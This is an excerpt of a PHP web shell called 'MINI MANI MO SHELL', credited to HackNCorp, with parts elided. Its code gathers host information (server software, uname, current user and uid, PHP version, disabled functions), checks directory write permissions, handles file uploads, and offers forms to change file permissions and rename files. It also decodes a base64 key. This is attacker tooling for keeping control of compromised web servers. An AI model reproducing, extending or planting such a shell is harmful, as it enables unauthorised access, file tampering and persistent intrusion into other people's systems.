...
<head>
	<title>MINI MANI MO SHELL</title>
</head>
<style type="text/css">
body {
  overflow-x:hidden;
  ...
  background:url();
background-image: url(https://st.depositphotos.com/17620692/61016/v/450/depositphotos_610165864-stock-illustration-abstract-blue-black-background.jpg);
...
#content .first:hover {
	...
	text-shadow:0px 0px 1px #D512A3;
}
...
<tr><td>
<center>
<title="HacknCorp" alt="OdayForums" class="center" />
</marquee>
            <h1>MINI MANI MO SHELL</h1>
        </font>
<br><br><br>
<?php
...
if (empty($disfunc)) {
	$disf = "<font color='green'>NONE</font>";
} else {
	$disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
	echo "<center><br>COPYRIGHT &copy <a target='_blank' href='https://hackncorp.id/'>HACKNCORP.ID</a></center>";
	exit();
}
...
function cekdir() {
	...
	if (is_writable($lokasi)) {
		return "<font color='read'>Writeable</font>";
	} else {
...
echo "Server : <font color='white'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
echo "System : <font color='white'>".php_uname()."</font><br>";
echo "User : <font color='white'>".@get_current_user()."&nbsp;</font>( <font color='white'>".@getmyuid()."</font>)<br>";
echo "PHP Version : <font color='white'>".@phpversion()."</font><br>";
...
$k3yw = base64_decode('AcLSFNivGXo5DnoPqAdVxHB7qQrUvxjgXxmrGhEFH6v4');
...
if (isset($_POST['upwkwk'])) {
	if (isset($_POST['berkasnya'])) {
		...
		if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
			echo "File Uploaded ! &nbsp;<font color='green'><i>".$lokasi."/".$_FILES['berkas']['name']."</i></font><br><br>";
		} else {
		...
		if (file_exists($lokasi."/".$_POST['namalink'])) {
			echo "File Uploaded ! &nbsp;<font color='green'><i>".$lokasi."/".$_POST['namalink']."</i></font><br><br>";
		} else {
...
if (isset($_GET['fileloc'])) {
	...
	<input type="submit" value="Change" name="chm0d" class="up" style="cursor: pointer; border-color: #D512A3"/>
	</form>';
	...
	<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #D512A3"/>
	</form>';
...
echo '<div id="content"><table width="900" border="0" cellpadding="4" cellspacing="3" align="center">
<tr class="first">
